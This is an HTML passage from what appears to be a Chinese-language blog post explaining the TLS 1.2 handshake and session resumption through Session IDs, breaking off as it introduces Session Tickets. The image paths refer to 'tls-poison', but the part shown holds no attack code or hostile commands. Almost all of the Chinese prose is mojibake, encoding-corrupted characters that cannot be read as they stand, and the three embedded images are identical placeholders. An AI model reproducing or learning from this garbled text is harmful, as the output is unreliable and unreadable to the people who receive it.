å®¢æˆ·ç«¯ç”Ÿæˆç”¨äºåˆ›å»ºç”¨äºå¯¹ç§°åŠ å¯†çš„å¯†é’¥çš„ä¿¡æ¯ã€‚ å¯¹äº RSA ï¼Œå®¢æˆ·ç«¯éšåä½¿ç”¨æœåŠ¡å™¨çš„å…¬å…±å¯†é’¥å¯¹è¯¥å¯†é’¥ä¿¡æ¯è¿›è¡ŒåŠ å¯†å¹¶å°†å…¶å‘é€åˆ°æœåŠ¡å™¨ã€‚ å¯¹äºåŸºäº DH çš„å¯†ç å¥—ä»¶ï¼Œæ­¤æ¶ˆæ¯åŒ…å«å®¢æˆ·ç«¯çš„ DH å…¬é’¥ã€‚</p></li><li><p>(Optional) <strong>Certificate verify:</strong> å¦‚å‰æ‰€è¿°ï¼Œå½“å®¢æˆ·ç«¯å‡ºç¤ºè¯ä¹¦æ—¶ï¼Œæ­¤æ¶ˆæ¯ç”±å®¢æˆ·ç«¯å‘é€ã€‚ å…¶ç›®çš„æ˜¯å…è®¸æœåŠ¡å™¨å®Œæˆå¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯çš„è¿‡ç¨‹ã€‚ ä½¿ç”¨æ­¤æ¶ˆæ¯æ—¶ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨åŠ å¯†å“ˆå¸Œå‡½æ•°å‘é€å…¶è¿›è¡Œæ•°å­—ç­¾åçš„ä¿¡æ¯ã€‚ å½“æœåŠ¡å™¨ä½¿ç”¨å®¢æˆ·ç«¯çš„å…¬å…±å¯†é’¥è§£å¯†æ­¤ä¿¡æ¯æ—¶ï¼ŒæœåŠ¡å™¨ä¾¿èƒ½å¤Ÿå¯¹å®¢æˆ·ç«¯è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p></li><li><p><strong>Change cipher spec:</strong> å®¢æˆ·ç«¯å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œå‘ŠçŸ¥æœåŠ¡å™¨æ›´æ”¹ä¸ºåŠ å¯†æ¨¡å¼ã€‚</p></li><li><p><strong>Finished</strong>: å®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡å™¨å·²å‡†å¤‡å¥½å¼€å§‹å®‰å…¨æ•°æ®é€šä¿¡ã€‚</p></li><li><p><strong>Change cipher spec:</strong> æœåŠ¡å™¨å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œå‘ŠçŸ¥å®¢æˆ·ç«¯æ›´æ”¹ä¸ºåŠ å¯†æ¨¡å¼ã€‚</p></li><li><p><strong>Finished:</strong> æœåŠ¡å™¨å‘Šè¯‰å®¢æˆ·ç«¯å®ƒå·²å‡†å¤‡å¥½å¼€å§‹å®‰å…¨æ•°æ®é€šä¿¡ï¼Œæ¡æ‰‹åˆ°æ­¤ç»“æŸã€‚</p></li><li><p><strong>Encrypted data:</strong> å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä½¿ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•å’Œåœ¨å®¢æˆ·ç«¯é—®å€™å’ŒæœåŠ¡å™¨é—®å€™æœŸé—´åå•†çš„åŠ å¯†å“ˆå¸Œå‡½æ•°ï¼Œä»¥åŠä½¿ç”¨å®¢æˆ·ç«¯åœ¨å®¢æˆ·ç«¯å¯†é’¥äº¤æ¢æœŸé—´å‘é€ç»™æœåŠ¡å™¨çš„ç§˜å¯†å¯†é’¥è¿›è¡Œé€šä¿¡ã€‚ æ­¤æ—¶å¯ä»¥é‡æ–°åå•†æ¡æ‰‹ã€‚</p></li><li><p><strong>Close Messages:</strong> åœ¨è¿æ¥ç»“æŸæ—¶ï¼ŒåŒæ–¹éƒ½ä¼šå‘é€ close_notify Alert æŠ¥æ–‡ï¼Œä»¥é€šçŸ¥å¯¹ç­‰æ–¹è¯¥è¿æ¥å·²å…³é—­ã€‚</p></li></ol><p>å¤§è‡´æµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/1.png" alt=""></p><p>å¯¹äºä¸åŒçš„å¯†é’¥ç®—æ³•åˆä¼šäº§ç”Ÿç¨å¾®ä¸ä¸€è‡´çš„æµç¨‹ï¼Œè¿™é‡Œå¹¶ä¸ä½œä¸ºé‡ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸å†å±•å¼€æè¿°äº†ã€‚</p><h4 id="TLS-1-2-Session-Resumption-Overview"><a href="#TLS-1-2-Session-Resumption-Overview" class="headerlink" title="TLS 1.2 Session Resumption Overview"></a>TLS 1.2 Session Resumption Overview</h4><p>å®Œæ•´çš„ TLS æ¡æ‰‹äº§ç”Ÿçš„é¢å¤–å»¶æ—¶å’Œè®¡ç®—æˆæœ¬å¯¹æ‰€æœ‰éœ€è¦å®‰å…¨é€šä¿¡çš„åº”ç”¨ç¨‹åºç‰ºç‰²äº†å¾ˆå¤šæ€§èƒ½ä»£ä»·ï¼Œä¸ºäº†å¸®åŠ©é™ä½éƒ¨åˆ†æˆæœ¬ï¼Œ TLS æä¾›äº†ä¸€ç§æœºåˆ¶æ¢å¤ä¼šè¯æœºåˆ¶ï¼Œç”¨æ¥æ¢å¤æˆ–å…±äº«å¤šä¸ªè¿æ¥ä¹‹é—´çš„ç›¸åŒåå•†çš„ç§˜é’¥æ•°æ®ã€‚ä¼šè¯æ¢å¤æ˜¯ä¸€ä¸ªé‡è¦çš„ä¼˜åŒ–éƒ¨ç½²ï¼Œç®€ç•¥çš„æ¡æ‰‹æ¶ˆé™¤äº†ä¸€ä¸ªå®Œæ•´çš„ TLS æ¡æ‰‹å¾€è¿”è€—æ—¶ï¼Œå¤§å¤§é™ä½äº†åŒæ–¹çš„è®¡ç®—æˆæœ¬ã€‚åœ¨ TLS 1.2 ä¸­ï¼Œ TLS Session Resumption å¯ä»¥é‡‡ç”¨ Session ID å’Œä¼šè¯ç¥¨æœºåˆ¶æ¥å®ç°ã€‚é™¤äº†æ€§èƒ½ä¸Šçš„ä¼˜åŠ¿å¤–ï¼Œæ¢å¤çš„ä¼šè¯è¿˜å¯ä»¥ç”¨äºå•ç‚¹ç™»å½•ï¼Œå› ä¸ºå®ƒä¿è¯äº†åŸå§‹ä¼šè¯å’Œä»»ä½•æ¢å¤çš„ä¼šè¯éƒ½æ¥è‡ªåŒä¸€ä¸ªå®¢æˆ·ç«¯ã€‚</p><h4 id="TLS-1-2-Session-Resumption-Session-ID"><a href="#TLS-1-2-Session-Resumption-Session-ID" class="headerlink" title="TLS 1.2 Session Resumption - Session ID"></a>TLS 1.2 Session Resumption - Session ID</h4><p>åœ¨è¿™ç§æœºåˆ¶ä¸­ï¼ŒæœåŠ¡å™¨åœ¨ä¸å®¢æˆ·ç«¯åˆæ¬¡æ¡æ‰‹æ—¶ï¼ŒæœåŠ¡å™¨ä¼šéšæœºåˆ†é…ä¸€ä¸ª Session IDã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å°†è¿™ä¸ªä¼šè¯IDä¸ä¼šè¯å¯†é’¥å’Œè¿æ¥çŠ¶æ€ä¸€èµ·å­˜å‚¨ã€‚ä¸ºäº†æ¢å¤ä¼šè¯ï¼Œå®¢æˆ·ç«¯å°†å­˜å‚¨çš„ä¼šè¯IDä¸ç¬¬ä¸€ä¸ªåè®®æ¶ˆæ¯ï¼ˆClientHelloï¼‰ä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ã€‚å¦‚æœæœåŠ¡å™¨è¯†åˆ«åˆ°äº†è¿æ¥å¹¶æ„¿æ„æ¢å¤ä¼šè¯ï¼Œå®ƒå°±ä¼šç”¨ç›¸åŒçš„ä¼šè¯IDæ¥å›å¤ï¼Œé‡æ–°å»ºç«‹å„è‡ªçš„ä¼šè¯ã€‚è¿™æ ·å°±å¯ä»¥å¿«é€Ÿå»ºç«‹å®‰å…¨çš„è¿æ¥ï¼Œè€Œä¸”ç”±äºæˆ‘ä»¬é‡ç”¨äº†ä¹‹å‰åå•†å¥½çš„ä¼šè¯æ•°æ®ï¼Œæ‰€ä»¥ä¸ä¼šæŸå¤±å®‰å…¨æ€§ã€‚</p><p>Client åœ¨ä¸€å¼€å§‹å‘é€ ClientHello æ¶ˆæ¯ä¸­ï¼Œ ClientHello æ¶ˆæ¯ä¸­åŒ…æ‹¬ä¸€ä¸ªå¯å˜é•¿åº¦çš„ Session IDã€‚å¦‚æœä¸ºç©ºåˆ™è¡¨ç¤ºæ˜¯ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼ŒServer åœ¨è¿”å› ServerHello æ—¶å°±ä¼šå‘é€ä¸€ä¸ª Session ID ï¼Œæ­¤æ—¶å†…å®¹ä¸º Server äº§ç”Ÿï¼Œå½“åå•†æ¡æ‰‹å®Œæˆåï¼ŒSession ID å°±å˜å¾—æœ‰æ•ˆï¼Œå¹¶ä¸€ç›´å­˜åœ¨ï¼Œç›´åˆ°ç”±äºè¶…è¿‡æœ‰æ•ˆæ—¶é—´æˆ–å› ä¸ºåœ¨ä¸ä¼šè¯ç›¸å…³çš„è¿æ¥ä¸Šé‡åˆ°æœåŠ¡å™¨é”™è¯¯è€Œè¢«åˆ é™¤ã€‚å¦‚æœä¸ä¸ºç©ºï¼Œè¯¥å€¼å°±è¡¨ç¤ºå®¢æˆ·ç«¯å¸Œæœ›é‡ç”¨è¯¥ä¼šè¯çš„å®‰å…¨å‚æ•°ï¼ŒServer ä¼šæ£€æŸ¥å®ƒçš„ä¼šè¯ç¼“å­˜ä»¥è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸï¼Œå¹¶ä¸” Server æ„¿æ„åœ¨æŒ‡å®šçš„ä¼šè¯çŠ¶æ€ä¸‹é‡å»ºè¿æ¥ï¼Œå®ƒå°†ä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰ç›¸åŒä¼šè¯ ID å€¼çš„ ServerHello æ¶ˆæ¯ï¼Œè¿™æ—¶ Client å’Œ Server å¿…é¡»éƒ½å‘é€ ChangeCipherSpec æ¶ˆæ¯å¹¶ä¸”ç›´æ¥å‘é€ Finished æ¶ˆæ¯ï¼Œä¸€æ—¦é‡å»ºç«‹å®Œæˆï¼ŒClient å’Œ Server å¯ä»¥å¼€å§‹äº¤æ¢åº”ç”¨å±‚æ•°æ®ã€‚å¦‚æœä¸€ä¸ªä¼šè¯ ID ä¸åŒ¹é…ï¼ŒServer ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ä¼šè¯ IDï¼Œç„¶å TLS Client å’Œ Server éœ€è¦è¿›è¡Œä¸€æ¬¡å®Œæ•´çš„æ¡æ‰‹ã€‚</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Client                                                Server</span><br><span class="line"></span><br><span class="line">ClientHello                   --------&gt;</span><br><span class="line">                                                 ServerHello</span><br><span class="line">                                          [ChangeCipherSpec]</span><br><span class="line">                              &lt;--------             Finished</span><br><span class="line">[ChangeCipherSpec]</span><br><span class="line">Finished                      --------&gt;</span><br><span class="line">Application Data              &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">    Figure 2.  Message flow <span class="hljs-keyword">for</span> an abbreviated handshake</span><br></pre></td></tr></tbody></table></figure><p></p><p>åœ¨ RFC 5246 ä¸­ï¼Œå¯¹ SessionID åšå‡ºäº†è§„å®šï¼Œå…¶é•¿åº¦ä¸º 0-32 ä½ï¼š</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opaque SessionID&lt;<span class="hljs-number">0.</span><span class="hljs-number">.32</span>&gt;;</span><br></pre></td></tr></tbody></table></figure><p></p><p>åŒæ—¶ RFC å»ºè®® Session IDçš„å¯¿å‘½ä¸Šé™ä¸º24å°æ—¶ï¼Œå› ä¸ºè·å¾—<code>master_secret</code>çš„æ”»å‡»è€…å¯èƒ½ä¼šå†’å……è¢«å…¥ä¾µçš„ä¸€æ–¹ï¼Œç›´åˆ°ç›¸åº”çš„ Session ID å¤±æ•ˆã€‚</p><p>æ•´ä¸ªé‡ç”¨è¿‡ç¨‹æˆ‘ä»¬å¯ä»¥ä»ä¸‹å›¾æ¯”è¾ƒç›´è§‚çš„çœ‹åˆ°ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/2.jpeg" alt=""></p><p>å®¢æˆ·ç«¯é¦–å…ˆå‘é€äº†ä¸€ä¸ª Client Hello æ¶ˆæ¯ç»™æœåŠ¡ç«¯ï¼Œå¹¶ä¸”å…¶ Session ID ä¸ºç©ºï¼Œè¿™æ—¶å€™ Server å“åº”äº† Server Hello å½“ä¸­å°±ä¼šè¿”å›ä¸€ä¸ª 32 å­—èŠ‚é•¿åº¦çš„ Session IDã€‚ç°åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„ TLS ä¼šè¯ç¼“å­˜ä¸­éƒ½å­˜å‚¨äº† Session IDï¼Œå…¶å€¼ä¸º 56bcf9f6ea40ac1bbf05ff7fd209d423da9f96404103226c7f927ad7a2992433ã€‚è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯ï¼Œåœ¨ä¸‹ä¸€æ¬¡TLSè¿æ¥è¯·æ±‚ä¸­ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦å†ç»å†å®Œæ•´çš„TLSæ¡æ‰‹ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/3.jpeg" alt=""></p><p>å®¢æˆ·ç«¯åªéœ€åœ¨å…¶ Client Hello æ¶ˆæ¯ä¸­å‘é€ä¹‹å‰ä» Server é‚£é‡Œå¾—çŸ¥çš„ Session ID ï¼Œç„¶å Server ç¡®è®¤è¿™ä¸ª Session ID åœ¨å®ƒçš„ TLS ä¼šè¯ç¼“å­˜ä¹‹åï¼Œå®ƒä»¬å°±ä¼šè¿›è¡Œæ‰€è°“çš„ Abbreviated TLS Handshake ã€‚åœ¨è¿™æ¬¡ TLS æ¡æ‰‹è¿‡ç¨‹ä¸­ä¸ä¼šäº¤æ¢è¯ä¹¦æˆ–å¯†é’¥ä¿¡æ¯ï¼Œä¹‹å‰åå•†å¥½çš„å¯†é’¥ä¼šè¢«é‡æ–°ä½¿ç”¨ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€æ¬¡ TLS Session Resumption ã€‚</p><h4 id="TLS-1-2-Session-Resumption-Session-Ticket"><a href="#TLS-1-2-Session-Resumption-Session-Ticket" class="headerlink" title="TLS 1.2 Session Resumption - Session Ticket"></a>TLS 1.2 Session Resumption - Session Ticket</h4><p>ç„¶è€Œï¼ŒSession ID æœºåˆ¶çš„ä¸€ä¸ªå®é™…é™åˆ¶æ˜¯è¦æ±‚æœåŠ¡å™¨ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯åˆ›å»ºå’Œç»´æŠ¤ä¸€ä¸ªä¼šè¯ç¼“å­˜ã€‚è¿™å°±å¯¼è‡´äº†æœåŠ¡å™¨ä¸Šçš„å‡ ä¸ªé—®é¢˜ï¼Œæ¯å¤©å¯èƒ½ä¼šæœ‰æˆåƒä¸Šä¸‡ç”šè‡³ä¸Šç™¾ä¸‡ä¸ªç‹¬ç‰¹çš„è¿æ¥ï¼›æ¯ä¸€ä¸ªæ‰“å¼€çš„TLSè¿æ¥éƒ½ä¼šæ¶ˆè€—å†…å­˜ï¼Œéœ€è¦ Session ID ç¼“å­˜å’Œåˆ é™¤ç­–ç•¥ï¼Œä»¥åŠå¯¹äºæœ‰è®¸å¤šæœåŠ¡å™¨çš„çƒ­é—¨ç½‘ç«™çš„éƒ¨ç½²æŒ‘æˆ˜ï¼Œç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™äº›ç½‘ç«™åº”è¯¥ä½¿ç”¨å…±äº«çš„ TLS Session ç¼“å­˜ä»¥è·å¾—æœ€ä½³æ€§èƒ½ã€‚å› æ­¤ï¼Œå¯¹äºä»»ä½•å¤šæœåŠ¡å™¨çš„éƒ¨ç½²ï¼ŒSession ID éƒ½éœ€è¦ä¸€äº›ä»”ç»†çš„æ€è€ƒå’Œç³»ç»Ÿæ¶æ„ï¼Œä»¥ç¡®ä¿ä¼šè¯ç¼“å­˜çš„è‰¯å¥½è¿è¡Œã€‚</p><p>ä¸ºäº†è§£å†³æœåŠ¡å™¨ç«¯éƒ¨ç½² TLS ä¼šè¯ç¼“å­˜çš„è¿™ä¸€é—®é¢˜ï¼Œå¼•å…¥äº† Session Ticket (RFC 